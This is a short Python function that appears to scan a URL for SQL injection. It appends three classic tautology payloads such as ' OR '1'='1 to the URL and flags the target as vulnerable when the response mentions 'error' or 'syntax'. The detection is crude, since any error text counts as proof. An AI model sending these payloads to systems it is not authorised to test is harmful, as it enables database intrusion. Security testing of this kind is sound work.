import requests

def test_sql_injection(url):
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 'a'='a"]
    vulnerable = False
    for payload in sql_payloads:
        target_url = f"{url}{payload}"
        response = requests.get(target_url)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            vulnerable = True
            print(f"[!] SQL Injection vulnerability detected with payload: {payload}")
    if not vulnerable:
        print("No SQL Injection vulnerabilities found.")
